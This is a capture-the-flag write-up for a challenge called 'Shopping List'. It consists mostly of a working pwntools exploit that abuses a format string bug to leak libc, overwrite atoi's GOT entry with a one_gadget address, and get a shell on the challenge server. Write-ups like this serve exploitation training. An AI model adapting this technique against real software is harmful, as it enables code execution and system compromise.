# Shopping List
> LongChampion, 06/04/2020

## Challenge
These is a format string vulnerable in `Edit Item` function. You need to add one item, then "edit" it to use this bug multiple times.  
I use format string to scan return address of `main` function to leak libc base address. Then I use this bug again to overwrite `atoi_got` address with one_gadget.

## Solution
```python
#!/usr/bin/env python2
from pwn import *
context.binary = "./ShoppingList"

r = remote("jh2i.com", 50002)
lib = ELF("libc6_2.23-0ubuntu10_amd64.so", checksec=False)

BASE = 74


def Add(Content):
    r.sendlineafter(">", "1")
    r.sendlineafter("add?", Content)


def Edit(idx, Content):
    r.sendlineafter(">", "3")
    r.sendlineafter("item?", str(idx))
    r.sendlineafter("value?", Content)


Add("Hello")
Edit(1, "%653$lx")
r.recvuntil("New Value: ")
Leak = r.recvline(keepends=False)
Leak = int(Leak, 16)
log.info("Leak: " + hex(Leak))
LIBC = Leak - lib.symbols["__libc_start_main"]
LIBC &= ~0xfff
log.success("LIBC: " + hex(LIBC))

atoi_got = 0x602048
# 0x45216, 0x4526a, 0xf02a4, 0xf1147
payload = fmtstr_payload(BASE, {atoi_got: LIBC + 0x4526a})
Edit(1, payload)

r.interactive()
```
